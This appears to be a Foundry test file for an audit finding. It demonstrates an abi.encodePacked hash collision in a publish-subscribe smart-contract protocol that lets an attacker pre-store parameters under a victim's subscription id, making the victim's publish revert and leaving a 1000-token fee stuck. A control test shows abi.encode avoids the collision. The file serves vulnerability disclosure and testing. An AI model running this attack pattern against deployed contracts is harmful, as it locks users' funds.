// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, PspStorage, FeeToken, Subscriber} from "./17619-publish-subscribe-protocol-users-are-vulnerable-to-a-denial.sol";

contract Finding17619Test is Test {
    function test_exploit_publish_reverts_and_fee_stays() public {
        Exploit e = new Exploit();
        e.run();

        PspStorage psp = e.psp();
        FeeToken token = e.token();
        uint256 fee = 1000 ether;

        assertTrue(e.publishReverted(), "publish did not revert");
        assertEq(e.stuck(), fee, "stuck amount");
        assertEq(token.balanceOf(address(psp)), fee, "1000 API3 left the contract");
        assertEq(psp.pending(address(e.alice())), fee, "alice pending");
        assertEq(psp.active(address(e.alice())), bytes32(0), "alice subscription opened");
        assertEq(token.balanceOf(address(e.alice())), 0, "alice still holds the fee");

        assertEq(
            psp.packedId(e.aliceParameters(), e.aliceConditions(), address(e.alice())),
            psp.packedId(e.eveParameters(), e.eveConditions(), address(e.alice())),
            "packed ids differ"
        );
        assertTrue(e.encodedAliceId() != e.encodedEveId(), "encoded ids collide");
        assertEq(psp.storedParameters(e.collidingId()), e.eveParameters(), "stored parameters");
        assertEq(psp.storedConditions(e.collidingId()), e.eveConditions(), "stored conditions");

        console2.log("stuck API3 wei");
        console2.log(e.stuck());
        console2.log("packed subscription id (alice ab|c and eve a|bc)");
        console2.logBytes32(e.collidingId());
        console2.log("abi.encode id for alice parameters");
        console2.logBytes32(e.encodedAliceId());
        console2.log("abi.encode id for eve parameters");
        console2.logBytes32(e.encodedEveId());
    }

    function test_control_abi_encode_lets_publish_succeed() public {
        Exploit e = new Exploit();
        PspStorage psp = e.psp();
        FeeToken token = e.token();
        uint256 fee = 1000 ether;

        token.mint(address(e.alice()), fee);
        e.alice().pullAndDeposit(token, psp, fee);
        e.eve().storeFor(psp, e.eveParameters(), e.eveConditions(), address(e.alice()));

        bytes32 opened = e.alice().publishEncoded(psp, e.aliceParameters(), e.aliceConditions());

        assertEq(psp.pending(address(e.alice())), 0, "fee still pending");
        assertEq(psp.active(address(e.alice())), opened, "publish did not open");
        assertEq(psp.storedParameters(opened), e.aliceParameters(), "opened parameters");
        assertEq(psp.storedConditions(opened), e.aliceConditions(), "opened conditions");
        assertTrue(opened != psp.packedId(e.aliceParameters(), e.aliceConditions(), address(e.alice())), "encode id equals packed id");
        assertEq(token.balanceOf(address(psp)), fee, "accepted fee");
        assertEq(token.balanceOf(address(e.alice())), 0, "alice refunded");

        console2.log("control opened id");
        console2.logBytes32(opened);
    }
}
